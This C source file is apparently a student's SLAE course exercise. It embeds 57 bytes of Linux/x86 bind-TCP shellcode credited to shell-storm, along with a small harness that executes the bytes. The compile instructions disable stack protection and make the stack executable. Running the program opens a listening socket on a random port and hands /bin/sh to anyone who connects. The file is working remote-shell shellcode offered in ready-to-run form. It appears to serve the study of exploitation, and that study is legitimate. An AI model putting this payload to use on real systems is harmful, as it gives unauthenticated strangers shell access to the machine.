/*
Filename:      shellcode-orig.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          x86 code but compiled on x64
Source:        http://shell-storm.org/shellcode/files/shellcode-837.php
Information:   Linux/x86 - Tiny Shell Bind TCP Random Port Shellcode - 57 bytes
Compiler:      gcc -m32 -ggdb -fno-stack-protector -z execstack shellcode-orig.c -o shellcode-orig
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
"\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0"
"\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80"
"\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8"
"\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x41\xcd\x80";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
